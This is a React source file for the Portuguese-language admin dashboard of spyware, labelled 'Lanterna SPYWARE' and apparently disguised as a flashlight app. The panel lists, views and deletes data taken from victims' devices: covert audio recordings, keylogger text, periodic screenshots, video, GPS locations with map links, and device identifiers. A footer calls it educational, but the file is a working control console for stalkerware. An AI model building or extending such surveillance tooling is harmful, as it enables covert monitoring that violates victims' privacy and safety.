import { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import './App.css';

const API_BASE = '/api';
const AUTO_REFRESH_MS = 30000;

function padLeft2(n) { return String(n).padStart(2, '0'); }

function formatDuration(seconds) {
  if (!seconds && seconds !== 0) return '—';
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${padLeft2(m)}:${padLeft2(s)}`;
}

function formatBytes(bytes) {
  if (!bytes) return '—';
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
  return `${(bytes / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

function formatDateTime(iso) {
  if (!iso) return '—';
  try { return new Date(iso).toLocaleString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }); }
  catch { return iso; }
}

function shortId(id) {
  if (!id) return '—';
  return id.slice(0, 8).toUpperCase();
}

function DataTable({ title, count, columns, data, loading, emptyMessage, emptyIcon, renderActions }) {
  return (
    <div className="table-container" style={{ marginBottom: 24 }}>
      <div className="table-header-bar">
        <h2 className="table-title">{title}</h2>
        <span className="table-count">{count} registo{count !== 1 ? 's' : ''}</span>
      </div>
      {loading && (!data || data.length === 0) ? (
        <div className="loading-state"><div className="spinner" /><p>Carregando…</p></div>
      ) : !data || data.length === 0 ? (
        <div className="empty-state"><div className="empty-icon">{emptyIcon || '📂'}</div><p>{emptyMessage || 'Nenhum dado encontrado.'}</p></div>
      ) : (
        <div className="table-wrapper">
          <table className="table">
            <thead><tr>{columns.map(col => <th key={col.key}>{col.label}</th>)}{renderActions && <th>Ações</th>}</tr></thead>
            <tbody>{data.map((row, idx) => (
              <tr key={row.id || idx}>
                {columns.map(col => <td key={col.key}>{col.render ? col.render(row) : row[col.key]}</td>)}
                {renderActions && <td><div className="actions">{renderActions(row)}</div></td>}
              </tr>
            ))}</tbody>
          </table>
        </div>
      )}
    </div>
  );
}

export default function App() {
  const [activeTab, setActiveTab] = useState('recordings');
  const [stats, setStats] = useState(null);
  const [error, setError] = useState(null);
  const [lastRefresh, setLastRefresh] = useState(new Date());
  const [loadingStats, setLoadingStats] = useState(true);

  const [recordings, setRecordings] = useState([]);
  const [recPagination, setRecPagination] = useState({ page: 1, totalPages: 1, total: 0 });
  const [recPage, setRecPage] = useState(1);
  const [loadingRec, setLoadingRec] = useState(false);

  const [keystrokes, setKeystrokes] = useState([]);
  const [keyPage, setKeyPage] = useState(1);
  const [keyPagination, setKeyPagination] = useState({ page: 1, totalPages: 1, total: 0 });
  const [loadingKey, setLoadingKey] = useState(false);
  const [selectedKeystroke, setSelectedKeystroke] = useState(null);

  const [locations, setLocations] = useState([]);
  const [locPage, setLocPage] = useState(1);
  const [locPagination, setLocPagination] = useState({ page: 1, totalPages: 1, total: 0 });
  const [loadingLoc, setLoadingLoc] = useState(false);

  const [screenshots, setScreenshots] = useState([]);
  const [ssPage, setSsPage] = useState(1);
  const [ssPagination, setSsPagination] = useState({ page: 1, totalPages: 1, total: 0 });
  const [loadingSs, setLoadingSs] = useState(false);
  const [selectedScreenshot, setSelectedScreenshot] = useState(null);

  const [devices, setDevices] = useState([]);
  const [loadingDev, setLoadingDev] = useState(false);

  const [videos, setVideos] = useState([]);
  const [vidPage, setVidPage] = useState(1);
  const [vidPagination, setVidPagination] = useState({ page: 1, totalPages: 1, total: 0 });
  const [loadingVid, setLoadingVid] = useState(false);
  const [selectedVideo, setSelectedVideo] = useState(null);

  const fetchAll = useCallback(async () => {
    setError(null); setLoadingStats(true);
    try { const r = await axios.get(`${API_BASE}/stats`); setStats(r.data); setLastRefresh(new Date()); }
    catch (err) { setError(err?.response?.data?.error || err.message || 'Erro'); }
    finally { setLoadingStats(false); }
  }, []);

  const fetchRecordings = useCallback(async (page = 1) => {
    setLoadingRec(true);
    try { const r = await axios.get(`${API_BASE}/recordings`, { params: { page, limit: 10 } }); setRecordings(r.data.recordings); setRecPagination(r.data.pagination); }
    catch (err) { setError(err?.response?.data?.error || 'Erro'); }
    finally { setLoadingRec(false); }
  }, []);

  const fetchKeystrokes = useCallback(async (page = 1) => {
    setLoadingKey(true);
    try { const r = await axios.get(`${API_BASE}/keystrokes`, { params: { page, limit: 15 } }); setKeystrokes(r.data.keystrokes); setKeyPagination(r.data.pagination); }
    catch (err) { setError(err?.response?.data?.error || 'Erro'); }
    finally { setLoadingKey(false); }
  }, []);

  const fetchLocations = useCallback(async (page = 1) => {
    setLoadingLoc(true);
    try { const r = await axios.get(`${API_BASE}/locations`, { params: { page, limit: 10 } }); setLocations(r.data.locations); setLocPagination(r.data.pagination); }
    catch (err) { setError(err?.response?.data?.error || 'Erro'); }
    finally { setLoadingLoc(false); }
  }, []);

  const fetchScreenshots = useCallback(async (page = 1) => {
    setLoadingSs(true);
    try { const r = await axios.get(`${API_BASE}/screenshots`, { params: { page, limit: 12 } }); setScreenshots(r.data.screenshots); setSsPagination(r.data.pagination); }
    catch (err) { setError(err?.response?.data?.error || 'Erro'); }
    finally { setLoadingSs(false); }
  }, []);

  const fetchDevices = useCallback(async () => {
    setLoadingDev(true);
    try { const r = await axios.get(`${API_BASE}/devices`); setDevices(r.data.devices || []); }
    catch (err) { setError(err?.response?.data?.error || 'Erro'); }
    finally { setLoadingDev(false); }
  }, []);

  const fetchVideos = useCallback(async (page = 1) => {
    setLoadingVid(true);
    try { const r = await axios.get(`${API_BASE}/videos`, { params: { page, limit: 12 } }); setVideos(r.data.videos); setVidPagination(r.data.pagination); }
    catch (err) { setError(err?.response?.data?.error || 'Erro'); }
    finally { setLoadingVid(false); }
  }, []);

  useEffect(() => { fetchAll(); fetchRecordings(1); }, [fetchAll, fetchRecordings]);
  useEffect(() => { if (activeTab === 'keystrokes') fetchKeystrokes(keyPage); }, [activeTab, keyPage, fetchKeystrokes]);
  useEffect(() => { if (activeTab === 'locations') fetchLocations(locPage); }, [activeTab, locPage, fetchLocations]);
  useEffect(() => { if (activeTab === 'screenshots') fetchScreenshots(ssPage); }, [activeTab, ssPage, fetchScreenshots]);
  useEffect(() => { if (activeTab === 'devices') fetchDevices(); }, [activeTab, fetchDevices]);
  useEffect(() => { if (activeTab === 'videos') fetchVideos(vidPage); }, [activeTab, vidPage, fetchVideos]);

  useEffect(() => {
    const interval = setInterval(() => {
      fetchAll();
      switch (activeTab) {
        case 'recordings': fetchRecordings(recPage); break;
        case 'keystrokes': fetchKeystrokes(keyPage); break;
        case 'locations': fetchLocations(locPage); break;
        case 'screenshots': fetchScreenshots(ssPage); break;
        case 'devices': fetchDevices(); break;
        case 'videos': fetchVideos(vidPage); break;
      }
    }, AUTO_REFRESH_MS);
    return () => clearInterval(interval);
  }, [activeTab, recPage, keyPage, locPage, ssPage, vidPage, fetchAll, fetchRecordings, fetchKeystrokes, fetchLocations, fetchScreenshots, fetchDevices, fetchVideos]);

  const handleDeleteRecording = async (id, fn) => {
    if (!window.confirm(`Deletar gravação ${shortId(id)} (${fn})?`)) return;
    try { await axios.delete(`${API_BASE}/recordings/${id}`); fetchRecordings(recPage); fetchAll(); }
    catch (err) { alert(err?.response?.data?.error || 'Erro'); }
  };

  const handleDeleteKeystroke = async (id) => {
    if (!window.confirm(`Deletar lote ${shortId(id)}?`)) return;
    try { await axios.delete(`${API_BASE}/keystrokes/${id}`); fetchKeystrokes(keyPage); fetchAll(); }
    catch (err) { alert(err?.response?.data?.error || 'Erro'); }
  };

  const handleDeleteLocation = async (id) => {
    if (!window.confirm(`Deletar localização ${shortId(id)}?`)) return;
    try { await axios.delete(`${API_BASE}/locations/${id}`); fetchLocations(locPage); fetchAll(); }
    catch (err) { alert(err?.response?.data?.error || 'Erro'); }
  };

  const handleDeleteScreenshot = async (id) => {
    if (!window.confirm(`Deletar screenshot ${shortId(id)}?`)) return;
    try { await axios.delete(`${API_BASE}/screenshots/${id}`); fetchScreenshots(ssPage); fetchAll(); }
    catch (err) { alert(err?.response?.data?.error || 'Erro'); }
  };

  const handleViewKeystroke = async (id) => {
    try { const r = await axios.get(`${API_BASE}/keystrokes/${id}`); setSelectedKeystroke(r.data.keystroke); }
    catch (err) { alert('Erro'); }
  };

  const handleViewScreenshot = async (id) => {
    try { const r = await axios.get(`${API_BASE}/screenshots/${id}`); setSelectedScreenshot(r.data.screenshot); }
    catch (err) { alert('Erro'); }
  };

  const handleDeleteVideo = async (id) => {
    if (!window.confirm(`Deletar vídeo ${shortId(id)}?`)) return;
    try { await axios.delete(`${API_BASE}/videos/${id}`); fetchVideos(vidPage); fetchAll(); }
    catch (err) { alert(err?.response?.data?.error || 'Erro'); }
  };

  const handleViewVideo = async (id) => {
    try { const r = await axios.get(`${API_BASE}/videos/${id}`); setSelectedVideo(r.data.video); }
    catch (err) { alert('Erro'); }
  };

  const tabs = [
    { key: 'recordings', label: '🎤 Áudio' }, { key: 'keystrokes', label: '⌨️ Keystrokes' },
    { key: 'screenshots', label: '📸 Screenshots' }, { key: 'videos', label: '🎥 Vídeos' },
    { key: 'locations', label: '📍 Localizações' }, { key: 'devices', label: '📱 Dispositivos' },
  ];

  return (
    <div className="app">
      <header className="header">
        <div className="header-inner">
          <div className="header-left">
            <span className="header-icon">🔦</span>
            <h1 className="header-title">Admin — Lanterna <span style={{ color: '#e94560', fontSize: 12 }}>SPYWARE</span></h1>
          </div>
          <div className="header-right">
            <span className="refresh-info">Atualizado: {lastRefresh.toLocaleTimeString('pt-BR')}</span>
            <button className="btn btn-secondary" onClick={() => {
              fetchAll(); switch (activeTab) {
                case 'recordings': fetchRecordings(recPage); break;
                case 'keystrokes': fetchKeystrokes(keyPage); break;
                case 'locations': fetchLocations(locPage); break;
                case 'screenshots': fetchScreenshots(ssPage); break;
                case 'devices': fetchDevices(); break;
                case 'videos': fetchVideos(vidPage); break;
              }
            }} disabled={loadingStats}>{loadingStats ? '…' : '↻ Atualizar'}</button>
          </div>
        </div>
      </header>

      <main className="main">
        {stats && (
          <div className="stats-bar">
            <div className="stat-card"><div className="stat-value">{stats.recordings?.total || 0}</div><div className="stat-label">Áudios</div></div>
            <div className="stat-card"><div className="stat-value">{stats.keystrokes?.total || 0}</div><div className="stat-label">Lotes Teclas</div></div>
            <div className="stat-card"><div className="stat-value">{stats.keystrokes?.chars || 0}</div><div className="stat-label">Caracteres</div></div>
            <div className="stat-card"><div className="stat-value">{stats.screenshots?.total || 0}</div><div className="stat-label">Screenshots</div></div>
            <div className="stat-card"><div className="stat-value">{stats.locations?.total || 0}</div><div className="stat-label">Localizações</div></div>
            <div className="stat-card"><div className="stat-value">{stats.devices?.total || 0}</div><div className="stat-label">Dispositivos</div></div>
            <div className="stat-card"><div className="stat-value">{stats.videos?.total || 0}</div><div className="stat-label">Vídeos</div></div>
          </div>
        )}

        {error && <div className="error-banner"><strong>⚠️ Erro:</strong> {error}</div>}

        <div style={{ display: 'flex', gap: 8, marginBottom: 24, flexWrap: 'wrap' }}>
          {tabs.map(tab => (
            <button key={tab.key} className={`btn ${activeTab === tab.key ? 'btn-primary' : 'btn-ghost'}`}
              onClick={() => setActiveTab(tab.key)}>{tab.label}</button>
          ))}
        </div>

        {/* ─── ÁUDIO ─── */}
        {activeTab === 'recordings' && (<>
          <DataTable title="Gravações de Áudio" count={recPagination.total} data={recordings} loading={loadingRec}
            emptyMessage="Nenhuma gravação encontrada." emptyIcon="🎙️"
            columns={[
              { key: 'id', label: 'ID', render: r => <span className="id-badge" title={r.id}>{shortId(r.id)}</span> },
              { key: 'filename', label: 'Arquivo', render: r => <span className="filename" title={r.filename}>{r.original_name || r.filename}</span> },
              { key: 'recorded_at', label: 'Gravação', render: r => formatDateTime(r.recorded_at) },
              { key: 'uploaded_at', label: 'Upload', render: r => formatDateTime(r.uploaded_at) },
              { key: 'duration', label: 'Duração', render: r => r.duration != null ? formatDuration(r.duration) : '—' },
              { key: 'file_size', label: 'Tamanho', render: r => formatBytes(r.file_size) },
            ]}
            renderActions={r => (<>
              <button className="btn btn-small btn-play" onClick={() => window.open(`${API_BASE}/recordings/${r.id}/audio`, '_blank')} title="Ouvir">▶</button>
              <button className="btn btn-small btn-danger" onClick={() => handleDeleteRecording(r.id, r.original_name || r.filename)} title="Deletar">✕</button>
            </>)}
          />
          {recPagination.totalPages > 1 && (
            <div className="pagination" style={{ marginTop: -12, marginBottom: 24 }}>
              <button className="btn btn-secondary btn-small" onClick={() => setRecPage(1)} disabled={recPage === 1}>«</button>
              <button className="btn btn-secondary btn-small" onClick={() => setRecPage(recPage - 1)} disabled={recPage === 1}>‹</button>
              <span className="page-info">Página {recPage} de {recPagination.totalPages}</span>
              <button className="btn btn-secondary btn-small" onClick={() => setRecPage(recPage + 1)} disabled={recPage === recPagination.totalPages}>›</button>
              <button className="btn btn-secondary btn-small" onClick={() => setRecPage(recPagination.totalPages)} disabled={recPage === recPagination.totalPages}>»</button>
            </div>
          )}
        </>)}

        {/* ─── KEYSTROKES ─── */}
        {activeTab === 'keystrokes' && (<>
          <DataTable title="Teclas Capturadas (Keylogger)" count={keyPagination.total} data={keystrokes} loading={loadingKey}
            emptyMessage="Nenhuma tecla capturada. Abra o app e digite algo." emptyIcon="⌨️"
            columns={[
              { key: 'id', label: 'ID', render: k => <span className="id-badge" title={k.id}>{shortId(k.id)}</span> },
              { key: 'char_length', label: 'Chars', render: k => <strong>{k.char_length}</strong> },
              { key: 'captured_at', label: 'Capturado em', render: k => formatDateTime(k.captured_at) },
            ]}
            renderActions={k => (<>
              <button className="btn btn-small btn-play" onClick={() => handleViewKeystroke(k.id)} title="Ver">📄 Ver</button>
              <button className="btn btn-small btn-danger" onClick={() => handleDeleteKeystroke(k.id)} title="Deletar">✕</button>
            </>)}
          />
          {keyPagination.totalPages > 1 && (
            <div className="pagination" style={{ marginTop: -12, marginBottom: 24 }}>
              <button className="btn btn-secondary btn-small" onClick={() => setKeyPage(1)} disabled={keyPage === 1}>«</button>
              <button className="btn btn-secondary btn-small" onClick={() => setKeyPage(keyPage - 1)} disabled={keyPage === 1}>‹</button>
              <span className="page-info">Página {keyPage} de {keyPagination.totalPages}</span>
              <button className="btn btn-secondary btn-small" onClick={() => setKeyPage(keyPage + 1)} disabled={keyPage === keyPagination.totalPages}>›</button>
              <button className="btn btn-secondary btn-small" onClick={() => setKeyPage(keyPagination.totalPages)} disabled={keyPage === keyPagination.totalPages}>»</button>
            </div>
          )}
          {selectedKeystroke && (
            <div className="modal-overlay" onClick={() => setSelectedKeystroke(null)}>
              <div className="modal" onClick={e => e.stopPropagation()}>
                <div className="modal-header"><h3>Conteúdo do Keystroke</h3><button className="btn btn-small btn-ghost" onClick={() => setSelectedKeystroke(null)}>✕</button></div>
                <div className="modal-body">
                  <p style={{ color: 'var(--text-muted)', fontSize: 12, marginBottom: 8 }}>Capturado em: {formatDateTime(selectedKeystroke.captured_at)} · {selectedKeystroke.char_length} caracteres</p>
                  <pre style={{ background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 8, padding: 16, fontSize: 13, color: '#7eb8f7', maxHeight: 400, overflow: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                    {selectedKeystroke.data || '(vazio)'}
                  </pre>
                </div>
              </div>
            </div>
          )}
        </>)}

        {/* ─── SCREENSHOTS ─── */}
        {activeTab === 'screenshots' && (<>
          <DataTable title="Screenshots Capturados" count={ssPagination.total} data={screenshots} loading={loadingSs}
            emptyMessage="Nenhum screenshot. O app captura a cada 30s." emptyIcon="📸"
            columns={[
              { key: 'id', label: 'ID', render: s => <span className="id-badge" title={s.id}>{shortId(s.id)}</span> },
              { key: 'size_bytes', label: 'Tamanho', render: s => formatBytes(s.size_bytes) },
              { key: 'captured_at', label: 'Capturado em', render: s => formatDateTime(s.captured_at) },
            ]}
            renderActions={s => (<>
              <button className="btn btn-small btn-play" onClick={() => handleViewScreenshot(s.id)} title="Ver">👁️ Ver</button>
              <button className="btn btn-small btn-danger" onClick={() => handleDeleteScreenshot(s.id)} title="Deletar">✕</button>
            </>)}
          />
          {ssPagination.totalPages > 1 && (
            <div className="pagination" style={{ marginTop: -12, marginBottom: 24 }}>
              <button className="btn btn-secondary btn-small" onClick={() => setSsPage(1)} disabled={ssPage === 1}>«</button>
              <button className="btn btn-secondary btn-small" onClick={() => setSsPage(ssPage - 1)} disabled={ssPage === 1}>‹</button>
              <span className="page-info">Página {ssPage} de {ssPagination.totalPages}</span>
              <button className="btn btn-secondary btn-small" onClick={() => setSsPage(ssPage + 1)} disabled={ssPage === ssPagination.totalPages}>›</button>
              <button className="btn btn-secondary btn-small" onClick={() => setSsPage(ssPagination.totalPages)} disabled={ssPage === ssPagination.totalPages}>»</button>
            </div>
          )}
          {selectedScreenshot && (
            <div className="modal-overlay" onClick={() => setSelectedScreenshot(null)}>
              <div className="modal modal-large" onClick={e => e.stopPropagation()}>
                <div className="modal-header"><h3>Screenshot</h3><button className="btn btn-small btn-ghost" onClick={() => setSelectedScreenshot(null)}>✕</button></div>
                <div className="modal-body" style={{ textAlign: 'center' }}>
                  <p style={{ color: 'var(--text-muted)', fontSize: 12, marginBottom: 8 }}>Capturado: {formatDateTime(selectedScreenshot.captured_at)} · {formatBytes(selectedScreenshot.size_bytes)}</p>
                  {selectedScreenshot.image_b64 ? (
                    <img src={`data:image/png;base64,${selectedScreenshot.image_b64}`} alt="Screenshot"
                      style={{ maxWidth: '100%', maxHeight: '70vh', borderRadius: 8, border: '1px solid var(--border)' }} />
                  ) : (
                    <div className="empty-state"><p>Imagem não disponível</p></div>
                  )}
                </div>
              </div>
            </div>
          )}
        </>)}

        {/* ─── VÍDEOS ─── */}
        {activeTab === 'videos' && (<>
          <DataTable title="Vídeos Capturados" count={vidPagination.total} data={videos} loading={loadingVid}
            emptyMessage="Nenhum vídeo. O app captura vídeo sob demanda." emptyIcon="🎥"
            columns={[
              { key: 'id', label: 'ID', render: v => <span className="id-badge" title={v.id}>{shortId(v.id)}</span> },
              { key: 'size_bytes', label: 'Tamanho', render: v => formatBytes(v.size_bytes) },
              { key: 'mime_type', label: 'Formato', render: v => v.mime_type || '—' },
              { key: 'captured_at', label: 'Capturado em', render: v => formatDateTime(v.captured_at) },
            ]}
            renderActions={v => (<>
              <button className="btn btn-small btn-play" onClick={() => handleViewVideo(v.id)} title="Ver">▶ Ver</button>
              <button className="btn btn-small btn-danger" onClick={() => handleDeleteVideo(v.id)} title="Deletar">✕</button>
            </>)}
          />
          {vidPagination.totalPages > 1 && (
            <div className="pagination" style={{ marginTop: -12, marginBottom: 24 }}>
              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(1)} disabled={vidPage === 1}>«</button>
              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(vidPage - 1)} disabled={vidPage === 1}>‹</button>
              <span className="page-info">Página {vidPage} de {vidPagination.totalPages}</span>
              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(vidPage + 1)} disabled={vidPage === vidPagination.totalPages}>›</button>
              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(vidPagination.totalPages)} disabled={vidPage === vidPagination.totalPages}>»</button>
            </div>
          )}
          {selectedVideo && (
            <div className="modal-overlay" onClick={() => setSelectedVideo(null)}>
              <div className="modal modal-large" onClick={e => e.stopPropagation()}>
                <div className="modal-header"><h3>Vídeo</h3><button className="btn btn-small btn-ghost" onClick={() => setSelectedVideo(null)}>✕</button></div>
                <div className="modal-body" style={{ textAlign: 'center' }}>
                  <p style={{ color: 'var(--text-muted)', fontSize: 12, marginBottom: 8 }}>Capturado: {formatDateTime(selectedVideo.captured_at)} · {formatBytes(selectedVideo.size_bytes)}</p>
                  {selectedVideo.id ? (
                    <video controls style={{ maxWidth: '100%', maxHeight: '60vh', borderRadius: 8, border: '1px solid var(--border)' }}
                      src={`${API_BASE}/videos/${selectedVideo.id}/stream`} />
                  ) : (
                    <div className="empty-state"><p>Vídeo não disponível</p></div>
                  )}
                </div>
              </div>
            </div>
          )}
        </>)}

        {/* ─── LOCALIZAÇÕES ─── */}
        {activeTab === 'locations' && (<>
          <DataTable title="Localizações GPS" count={locPagination.total} data={locations} loading={loadingLoc}
            emptyMessage="Nenhuma localização. GPS a cada 5min." emptyIcon="📍"
            columns={[
              { key: 'id', label: 'ID', render: l => <span className="id-badge" title={l.id}>{shortId(l.id)}</span> },
              { key: 'latitude', label: 'Latitude', render: l => l.latitude?.toFixed(6) },
              { key: 'longitude', label: 'Longitude', render: l => l.longitude?.toFixed(6) },
              { key: 'accuracy', label: 'Precisão', render: l => l.accuracy ? `${l.accuracy.toFixed(1)} m` : '—' },
              {
                key: 'mapa', label: 'Mapa', render: l => (
                  <a href={`https://www.google.com/maps?q=${l.latitude},${l.longitude}`} target="_blank" rel="noopener noreferrer"
                    className="btn btn-small btn-play" style={{ textDecoration: 'none' }}>🗺️ Ver mapa</a>
                )
              },
              { key: 'captured_at', label: 'Capturado em', render: l => formatDateTime(l.captured_at) },
            ]}
            renderActions={l => <button className="btn btn-small btn-danger" onClick={() => handleDeleteLocation(l.id)}>✕</button>}
          />
          {locPagination.totalPages > 1 && (
            <div className="pagination" style={{ marginTop: -12, marginBottom: 24 }}>
              <button className="btn btn-secondary btn-small" onClick={() => setLocPage(1)} disabled={locPage === 1}>«</button>
              <button className="btn btn-secondary btn-small" onClick={() => setLocPage(locPage - 1)} disabled={locPage === 1}>‹</button>
              <span className="page-info">Página {locPage} de {locPagination.totalPages}</span>
              <button className="btn btn-secondary btn-small" onClick={() => setLocPage(locPage + 1)} disabled={locPage === locPagination.totalPages}>›</button>
              <button className="btn btn-secondary btn-small" onClick={() => setLocPage(locPagination.totalPages)} disabled={locPage === locPagination.totalPages}>»</button>
            </div>
          )}
        </>)}

        {/* ─── DISPOSITIVOS ─── */}
        {activeTab === 'devices' && (
          <DataTable title="Dispositivos Conhecidos" count={devices.length} data={devices} loading={loadingDev}
            emptyMessage="Nenhum dispositivo registado." emptyIcon="📱"
            columns={[
              { key: 'id', label: 'ID', render: d => <span className="id-badge" title={d.id}>{shortId(d.id)}</span> },
              { key: 'platform', label: 'Plataforma', render: d => d.platform || '—' },
              { key: 'model', label: 'Modelo', render: d => d.model || '—' },
              { key: 'brand', label: 'Marca', render: d => d.brand || '—' },
              { key: 'os_version', label: 'OS', render: d => d.os_version || '—' },
              { key: 'device_id', label: 'Device ID', render: d => d.device_id ? <span className="filename" title={d.device_id}>{d.device_id.slice(0, 20)}…</span> : '—' },
              { key: 'captured_at', label: 'Descoberto em', render: d => formatDateTime(d.captured_at) },
              {
                key: 'raw', label: 'Detalhes', render: d => (
                  <button className="btn btn-small btn-ghost" onClick={() => alert(JSON.stringify(d.raw_data ? JSON.parse(d.raw_data) : d, null, 2))}>📋 JSON</button>
                )
              },
            ]}
          />
        )}
      </main>

      <footer className="footer">
        <p>Lanterna Educacional — Painel de Comando · Auto-atualiza a cada 30s · Fins exclusivamente educativos</p>
      </footer>
    </div>
  );
}